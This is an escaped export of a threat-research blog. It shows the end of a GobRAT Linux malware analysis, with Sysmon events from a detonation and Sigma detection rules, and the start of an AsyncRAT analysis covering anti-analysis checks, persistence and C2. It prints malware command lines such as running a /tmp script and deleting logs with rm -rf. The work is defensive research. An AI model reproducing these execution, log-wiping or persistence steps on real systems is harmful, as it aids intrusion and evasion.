Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff13-6475-f587-0ded3d560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26633</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nBesides to identify `nohup` execution, it checks if the command line contains `/tmp/` as well.\\r\\n\\r\\n```yml\\r\\ntitle: Nohup Tmp File Execution\\r\\nid: 457df417-8b9d-4912-85f3-9dbda39c3645\\r\\nstatus: experimental\\r\\ndescription: Detects the use of grep to identify information about the system using the parameter -q to do it in silent mode\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/nohup\'\\r\\n        CommandLine|contains: \'/tmp/\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - System Administrators using nohup\\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### Execution of Shell With Tmp Parent Process\\r\\n\\r\\nThe GobRAT payload makes use of `/bin/bash` from `/tmp/` folder, something that is insteresting.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16950</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff14-6475-0507-2fb57a550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26649</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/bash</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">/bin/bash -c uptime</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/tmp/env/.qnapd</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26638</Data>\\r\\n        <Data Name=\\"ParentImage\\">/tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nAny binary from `/tmp/` using `/bin/bash` or `/bin/sh`, it is interesting to know. Therefore, I have generated the following rule. \\r\\n\\r\\n```yml\\r\\ntitle: Execution of Shell With Tmp Parent Process\\r\\nid: 2fade0b6-7423-4835-9d4f-335b39b83867\\r\\nstatus: experimental\\r\\ndescription: Detects suspicious executions of shells with tmp parents\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        ParentImage|startswith: \'/tmp/\'\\r\\n        CommandLine|contains: \\r\\n          - \'/bin/bash\'\\r\\n          - \'/bin/sh\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### Execution of Script In Tmp Folder\\r\\n\\r\\nVery similar to the above section, however, in this case they executing a script stored in `/tmp/` using `/bin/sh`.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16981</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff45-6475-f597-3cd5db550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26665</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">/bin/sh -c /tmp/env/.qnapd/sshd.sh</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/root</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">49</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{00000000-0000-0000-0000-000000000000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26664</Data>\\r\\n        <Data Name=\\"ParentImage\\">-</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">-</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nAnd if you want to detect this kind of behavior, use the next sigma rule.\\r\\n\\r\\n```yml\\r\\ntitle: Execution of Script In Tmp Folder\\r\\nid: 30bcce26-51c5-49f2-99c8-7b59e3af36c7\\r\\nstatus: experimental\\r\\ndescription: Detects executions of scripts stored in tmp folder using bash or sh\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection_shell:\\r\\n        CommandLine|contains: \\r\\n          - \'/bin/bash\'\\r\\n          - \'/bin/sh\'\\r\\n    selection_parameters:\\r\\n        CommandLine|contains|all: \\r\\n          - \'/tmp/\'\\r\\n          - \'-c\'\\r\\n    condition: all of selection_*\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### File Deletion\\r\\n\\r\\nMultiple files are deleted during the execution, probably to avoid be detected by software and analysts. Most of the actity is under the path `/tmp/env/.qnapd/`. Next sysmon event is just one of the files deleted during the exeution.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16774</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-e1f4-c3d0eb550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26560</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/rm</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">rm -rf /tmp/env/.qnapd/bot.log</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nAnd yes, there is a [public sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml) rule to detect files deleted in the system! Although it is a little generic, it can help us\\r\\n\\r\\n```yml\\r\\ntitle: File Deletion\\r\\nid: 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57\\r\\nstatus: stable\\r\\ndescription: Detects file deletion using \\"rm\\", \\"shred\\" or \\"unlink\\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity\\r\\nreferences:\\r\\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\\r\\nauthor: \xd6mer G\xfcnal, oscd.community\\r\\ndate: 2020/10/07\\r\\nmodified: 2022/09/15\\r\\ntags:\\r\\n    - attack.defense_evasion\\r\\n    - attack.t1070.004\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith:\\r\\n            - \'/rm\'     # covers /rmdir as well\\r\\n            - \'/shred\'\\r\\n            - \'/unlink\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate administration activities\\r\\nlevel: informational\\r\\n```\\r\\n\\r\\n### Process Discovery\\r\\n\\r\\nThe use of `ps` command is another capability implemented by this loader during the execution.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16813</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-f1bb-6c01f7550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26574</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/ps</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">ps -ef</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{00000000-0000-0000-0000-000000000000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26573</Data>\\r\\n        <Data Name=\\"ParentImage\\">-</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">-</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\n[Public sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_process_discovery.yml) rule that can help us to detect the use of `ps` with information level.\\r\\n\\r\\n```yml\\r\\ntitle: Process Discovery\\r\\nid: 4e2f5868-08d4-413d-899f-dc2f1508627b\\r\\nstatus: stable\\r\\ndescription: |\\r\\n  Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.\\r\\n  Information obtained could be used to gain an understanding of common software/applications running on systems within the network\\r\\nreferences:\\r\\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1057/T1057.md\\r\\nauthor: \xd6mer G\xfcnal, oscd.community\\r\\ndate: 2020/10/06\\r\\nmodified: 2022/07/07\\r\\ntags:\\r\\n    - attack.discovery\\r\\n    - attack.t1057\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith:\\r\\n            - \'/ps\'\\r\\n            - \'/top\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate administration activities\\r\\nlevel: informational\\r\\n```\\r\\n\\r\\n### System Information Discovery\\r\\n\\r\\nGobRAT Loaders execute multiple discovery commands during the infection. Just to mention a few of them, next two sysmon events are related to system information discovery.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16950</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff14-6475-0507-2fb57a550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26649</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/bash</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">/bin/bash -c uptime</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/tmp/env/.qnapd</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26638</Data>\\r\\n        <Data Name=\\"ParentImage\\">/tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16784</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-81fa-b29af3550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26565</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/uname</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">uname -m</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nFor this behaviors, there is another public [sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml) to detect them.\\r\\n\\r\\n\\r\\n```yml\\r\\ntitle: System Information Discovery\\r\\nid: 42df45e7-e6e9-43b5-8f26-bec5b39cc239\\r\\nstatus: stable\\r\\ndescription: Detects system information discovery commands\\r\\nreferences:\\r\\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md\\r\\nauthor: \xd6mer G\xfcnal, oscd.community\\r\\ndate: 2020/10/08\\r\\nmodified: 2021/09/14\\r\\ntags:\\r\\n    - attack.discovery\\r\\n    - attack.t1082\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith:\\r\\n            - \'/uname\'\\r\\n            - \'/hostname\'\\r\\n            - \'/uptime\'\\r\\n            - \'/lspci\'\\r\\n            - \'/dmidecode\'\\r\\n            - \'/lscpu\'\\r\\n            - \'/lsmod\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate administration activities\\r\\nlevel: informational\\r\\n```\\r\\n\\r\\n## Conclusions\\r\\n\\r\\nAlthough the campaign was initially aimed at routers, as we have seen, the behaviors are very generic and linux endpoints could be targeted, where in fact some of the analyzed behaviors have already been used previously by other threat actors.\\r\\n\\r\\nThis is an approach on how from a CTI point of view where new trends, campaigns and malware are analyzed, it can lead to the generation of new threats.\\r\\n\\r\\nAll the sigma rules created by myself are pushed to the official repo.\\r\\n\\r\\n## Contact\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"AsyncRAT-Analysis","metadata":{"permalink":"/jstnk9/research/AsyncRAT-Analysis","source":"@site/research/2022-06-01-AsyncRAT-analysis/2022-06-01-AsyncRAT-analysis.md","title":"Analyzing AsyncRAT distributed in Colombia by Blind Eagle","description":"Summary","date":"2022-06-01T00:00:00.000Z","formattedDate":"June 1, 2022","tags":[{"label":"threat hunting","permalink":"/jstnk9/research/tags/threat-hunting"},{"label":"detection","permalink":"/jstnk9/research/tags/detection"},{"label":"analysis","permalink":"/jstnk9/research/tags/analysis"},{"label":"research","permalink":"/jstnk9/research/tags/research"},{"label":"asyncrat","permalink":"/jstnk9/research/tags/asyncrat"},{"label":".NET","permalink":"/jstnk9/research/tags/net"},{"label":"BlindEagle","permalink":"/jstnk9/research/tags/blind-eagle"},{"label":"APT-C-36","permalink":"/jstnk9/research/tags/apt-c-36"}],"readingTime":11.34,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Dissecting GobRAT behaviors - Linux malware","permalink":"/jstnk9/research/GobRAT-Malware"},"nextItem":{"title":"Using Jlaive to create batch files from .NET assemblies for defense evasion","permalink":"/jstnk9/research/Jlaive-Antivirus-Evasion-Tool"}},"content":"## Summary\\r\\n\\r\\nDuring 2019-2021 I was focused on analyzing campaigns orchestrated by the `APT-C-36` group and RATs used by this same group and other cybercriminal groups such as `RemcosRAT`, `AsyncRAT`, `Imminent Monitor RAT`, etc. In the last few months I have seen some modifications of TTPs in many of these families that have caught my attention and I wanted to analyze them to see what is new. \\r\\n\\r\\nTherefore, during this entry we will go through the analysis of a sample of `AsyncRAT` distributed in Colombia during the last month.\\r\\n\\r\\n:::info\\r\\n\\r\\nThe objective of the analysis is to provide information on the execution of the binary, genealogy and other stuff, not to go into the details of the static part.\\r\\n\\r\\n:::\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Analysis\\r\\n\\r\\n### Static\\r\\n\\r\\nThe basic static information of the sample to be analyzed is shown in the table below.\\r\\n\\r\\n| Field      | Value |\\r\\n| ----------- | ----------- |\\r\\n| File name      | Stub.exe       |\\r\\n| Type   |  PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly        |\\r\\n| MD5   | c0b9838ff7d2ddecbfe296eae947e5d6       |\\r\\n| SHA1   | 76af794b85e4a4ba75c5703df1207b7a6798bf2e        |\\r\\n| SHA256   | 79068b82bcf0786b6af1b7cc96de1bf4e1a66b0d95e7e72ed1b1054443f6c5e3        |\\r\\n| File size   |   45.00 KB (46080 bytes)        |\\r\\n\\r\\n![static01](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/01-exeinfo.jpg)\\r\\n\\r\\nAfter verifying that the binary was C#, I decided to perform a small analysis of the code to check some of the actions that the malware should do once executed, before executing it on my systems.\\r\\n\\r\\n![basiccode](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/02-codebasic.png)\\r\\n\\r\\nIf we go to the `Main` function, which is the one defined in the entry point, we see that it contains the structure shown in the following image.\\r\\n\\r\\n![basiccode](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/03-main.png)\\r\\n\\r\\nThe binary will check a series of conditions to verify if it is being executed among other things in a virtual environment or not, and depending on the results, it will continue its normal flow or kill the process.\\r\\n\\r\\nThe first check is to verify if a series of settings established in the code, among which are the key, pastebin URL, version, etc.\\r\\n\\r\\n![basiccode](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/04-initializesettings.png)\\r\\n\\r\\nSecondly, it tries to create a mutex and stop similar processes of the same sample that may be running.\\r\\n\\r\\n![mutexcheck](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/05-mutex.png)\\r\\n\\r\\nIt then performs several checks to identify the context where it is running (mainly to see if it is a virtual machine or a sandbox). Different anti-analysis techniques are put in place.\\r\\n\\r\\nThe first of all is related to the `DetectManufacturer` method which aims to see if the system is related to Vmware, VirtualBox, or virtualized in general.\\r\\n\\r\\n![antianalysis](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/06-antianalysis1.png)\\r\\n\\r\\nThe next thing is to check if a debugger exists in the context of AsyncRAT. To do this, it makes use of the `isDebuggerPresent` API. \\r\\n\\r\\n![debugg](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/06-antianalysis2debugger.png)\\r\\n\\r\\nNext, the check is focused on seeing if the system where it was executed is the known [sandboxie](https://github.com/sandboxie-plus/Sandboxie), to check it, tries to identify if the DLL `SbieDll.dll` is running.\\r\\n\\r\\n![sandbxie](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/06-antianalysis3sandboxie.png)\\r\\n\\r\\nThe next check it performs is on the system disk capacity. In this case, it checks if the disk is less than 61000000000L (56.8 GB). If it is, it returns false.\\r\\n\\r\\n![disk](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/06-antianalysis5installdisk.png)\\r\\n\\r\\nThe last thing it performs in this set of checks is to identify if the operating system is Windows XP with a simple method.\\r\\n\\r\\n![xp](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/06-antianalysis6isXP.png)\\r\\n\\r\\nIt also aims to generate persistence in the system. To do this, it checks if the context of the process was launched with privileges, if so, it will make use of `schtasks.exe` to create a task. Otherwise, if the context is not found with administrator permissions, it will try to modify the registry key `Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run` to execute a copy of itself create in the `%appdata` path.\\r\\n\\r\\n![schedule](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/07-scheduledpersistence.png)\\r\\n\\r\\nAfter this, the sample copies itself into the `%appdata%` directory and will create a .bat file to first launch a `timeout`, run the sample from `%appdata%` and delete the .bat file.\\r\\n\\r\\n![batcreation](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/08-batcreation.png)\\r\\n\\r\\nThe last interesting activity is to establish communications with the C2 through the `ClientSocket.Reconnect();` and `ClientSocket.InitializeClient();` methods.\\r\\n\\r\\n![c2](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/09-c2.png)\\r\\n\\r\\nThe sample can perform many other actions once it is deployed in the environment. For example, the `Client.Helper.IdSender` class has a method called `sendInfo` which is responsible for sending information from the operating system to the C2.\\r\\n\\r\\n![sendinfo](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/10-sendinfo.png)\\r\\n\\r\\nGoing into detail of each class could take a long time, and in this case, the goal is to analyze the behavior once executed, so I leave a small image of a part of the classes and methods that incorporates the sample and we will perform an analysis of the behavior.\\r\\n\\r\\n![classesandmethods](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/11-classes.png)\\r\\n\\r\\n### Dynamic\\r\\n\\r\\n#### high level processes events\\r\\n\\r\\n![highlevelprocesses](https://jstnk9.github.io/jstnk9/img/research-asyncrat-analysis01/_highlevelactivityevents.png)\\r\\n\\r\\nNow it is time to detonate the malware in a controlled environment to verify the behavior of the malware. In this case, I did different executions with and without 